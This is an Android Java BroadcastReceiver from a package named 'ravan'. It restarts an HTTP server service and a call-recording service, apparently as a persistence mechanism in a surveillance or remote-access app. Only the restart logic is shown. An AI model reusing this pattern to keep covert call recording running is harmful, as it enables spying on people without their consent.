package com.security.ravan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class RestartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("RestartReceiver", "Restarting Service...");

        // Restart HttpServerService
        Intent serviceIntent = new Intent(context, HttpServerService.class);
        serviceIntent.setAction("START");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }

        // Restart CallRecordService
        Intent callServiceIntent = new Intent(context, CallRecordService.class);
        callServiceIntent.setAction("START_SERVICE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(callServiceIntent);
        } else {
            context.startService(callServiceIntent);
        }
    }
}
